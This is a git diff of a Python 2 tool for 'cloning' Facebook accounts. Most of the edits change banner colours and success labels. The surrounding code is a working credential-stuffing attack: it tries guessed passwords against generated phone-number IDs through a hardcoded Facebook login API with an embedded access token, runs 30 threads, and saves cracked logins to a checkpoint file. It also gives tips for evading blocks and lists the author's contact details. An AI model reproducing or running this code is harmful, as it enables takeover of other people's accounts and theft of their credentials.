@@ -100,8 +100,8 @@ print  """
 
 logo1 = """
 \033[1;91m░░▄█▀▄─▒▐█▀▀▄░░▄█▀▄─░▐█▀█▄▐██▒██▄░▒█▌
-\033[1;91m░▐█▄▄▐█▒▐█▒▐█░▐█▄▄▐█░▐█▌▐█░█▌▒▐█▒█▒█░
-\033[1;91m░▐█─░▐█▒▐█▀▄▄░▐█─░▐█░▐█▄█▀▐██▒██░▒██▌
+\033[1;92m░▐█▄▄▐█▒▐█▒▐█░▐█▄▄▐█░▐█▌▐█░█▌▒▐█▒█▒█░
+\033[1;95m░▐█─░▐█▒▐█▀▄▄░▐█─░▐█░▐█▄█▀▐██▒██░▒██▌
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••      
 \033[1;91m➣ \033[1;96m..BROTHERS NISAR SOOMRO OR SAJID ARADIN (^o^)
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••      
@@ -118,15 +118,15 @@ logo2 = """
 \033[1;92m░█▌░▒█░▒█░▒█░░░▒█░░░█▌░▐█▄▄▐█░▒▄▄█▀▀░
 \033[1;93m▐██▒▐█░░░░▒█▌░▒▄█▄░▐██░▐█─░▐█▒▐█▄▄▄█▌
 
-\033[1;92m➣      MY BROTHERS :  NISAR SOOMRO AND SAJID ARADIN 
+\033[1;92m➣ MY BROTHERS :  NISAR SOOMRO AND SAJID ARADIN 
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••   
 \033[1;96m➣ \033[1;93mTHANKS FOR USE MY COMMANDS ...
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••    
-\033[1;91m➣ \033[1;92mAUTHOR    :   \033[1;97mARADIN KINGS
-\033[1;92m➣ \033[1;93mFACEBOOK  :   \033[1;97mIMTIAZ ARADIN
-\033[1;93m➣ \033[1;91mWHATSAPP  :   \033[1;97m03237528063 
-\033[1;94m➣ \033[1;96mGITHUB    :   \033[1;97mA KING 110
-\033[1;96m➣ \033[1;92mBROTHERS  :   \033[1;97mNISAD SOOMRO AND SAJID ARADIN
+\033[1;91m➣ \033[1;92mAUTHOR    :   \033[1;91mARADIN KINGS
+\033[1;92m➣ \033[1;93mFACEBOOK  :   \033[1;92mIMTIAZ ARADIN
+\033[1;93m➣ \033[1;91mWHATSAPP  :   \033[1;93m03237528063 
+\033[1;94m➣ \033[1;96mGITHUB    :   \033[1;94mA KING 110
+\033[1;96m➣ \033[1;92mBROTHERS  :   \033[1;95mNISAD SOOMRO AND SAJID ARADIN
 \033[1;91m➣ \033[1;93mVERSION   :   \033[1;97m1.0.2
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••      
 \033[1;91m➣ \033[1;93mCP IDS OPEN 3 TO 5 DAYS..
@@ -141,7 +141,7 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;92m➣ \x1b[1;93mTOOL PASSWORD \x1b[1;97m»» \x1b[1;97m ")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:IMTIAZ
+            print "LOGGED IN SUCCESSFULLY AS " + username #Dev:IMTIAZ ARADIN
 	    time.sleep(2)
             loop = 'false'
         else:
@@ -217,7 +217,8 @@ def action():
     jalan ('\033[1;91m[+] TOTAL IDS NUMBER: '+xxx)
     jalan ('\033[1;92m[+] CODE YOU CHOOSE: '+c)
     jalan ("\033[1;93m[+] WAIT A WHILE START CRACKING...")
-    jalan ("\033[1;94m[+] TO STOP PROCESS PRESS CTRL+Z")
+    jalan ("\033[1;93m[+] NOT SHOW ANY ACCOUNT USE AIRPLANE MOD")
+    jalan ("\033[1;94m[+] TO STOP CLONING PRESS CTRL+Z")
     print 50* '\033[1;97m-'
     def main(arg):
         global cpb,oks
@@ -231,14 +232,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[Successfull] ' + k + c + user + '  |  ' + pass1                                       
+                print '\x1b[1;92m[ARADIN-OK] ' + k + c + user + '  |  ' + pass1                                       
                 okb = open('save/Checkpoint.txt', 'a')
                 okb.write(k+c+user+pass1+'\n')
                 okb.close()
                 oks.append(c+user+pass1)
             else:
                 if 'www.facebook.com' in q['error_msg']:
-                    print '\033[1;97m[Checkpoint] ' + k + c + user + '  |  ' + pass1
+                    print '\033[1;97m[ARADIN-CP] ' + k + c + user + '  |  ' + pass1
                     cps = open('save/Checkpoint.txt', 'a')
                     cps.write(k+c+user+pass1+'\n')
                     cps.close()
@@ -248,14 +249,14 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;92m[Successfull] ' + k + c + user +  '  |  ' + pass2
+                        print '\x1b[1;92m[ARADIN-OK] ' + k + c + user +  '  |  ' + pass2
                         okb = open('save/Checkpoint.txt', 'a')
                         okb.write(k+c+user+pass2+'\n')
                         okb.close()
                         oks.append(c+user+pass2)
                     else:
                         if 'www.facebook.com' in q['error_msg']:
-                            print '\033[1;97m[Checkpoint] ' + k + c + user + '  |  ' + pass2
+                            print '\033[1;97m[ARADIN-CP] ' + k + c + user + '  |  ' + pass2
                             cps = open('save/Checkpoint.txt', 'a')
                             cps.write(k+c+user+pass2+'\n')
                             cps.close()
@@ -265,14 +266,14 @@ def action():
                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                             q = json.load(data)
                             if 'access_token' in q:
-                                print '\x1b[1;92m[Successfull] ' + k + c + user + '  |  ' + pass3
+                                print '\x1b[1;92m[ARADIN-OK] ' + k + c + user + '  |  ' + pass3
                                 okb = open('save/Checkpoint.txt', 'a')
                                 okb.write(k+c+user+pass3+'\n')
                                 okb.close()
                                 oks.append(c+user+pass3)
                             else:
                                if 'www.facebook.com' in q['error_msg']:
-                                   print '\033[1;97m[Checkpoint] ' + k + c + user + '  |  ' + pass3
+                                   print '\033[1;97m[ARADIN-CP] ' + k + c + user + '  |  ' + pass3
                                    cps = open('save/Checkpoint.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
@@ -285,13 +286,13 @@ def action():
     p = ThreadPool(30)
     p.map(main, id)
     print 50* '\033[1;91m-'
-    print 'Process Has Been Completed ...'
+    print 'PROCESS HAS BEEN COMPLETED ...'
     print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
-    print('Cloned Accounts Has Been Saved : save/Checkpoint')
-    jalan("Note : Your Checkpoint Accounts Will Open after  5 days")
+    print('CLONED ACCOUNTS HAS BEEN SAVED : save/Checkpoint')
+    jalan("NOTE : YOUR CHECKPOINT ACCOUNTS WILL OPEN AFTER  3 TO 5 DAYS")
     print ''
     print """
-    \033[1;92m.                                  _____________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶______________
+    \033[1;92m. _____________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶______________
 ______¶¶¶¶¶¶¶¶¶___________¶¶¶¶¶¶¶¶¶_______
 ____¶¶¶¶¶__________¶¶¶¶¶__________¶¶¶¶¶___
 ____¶¶___________¶¶¶¶¶¶¶¶¶____________¶¶__
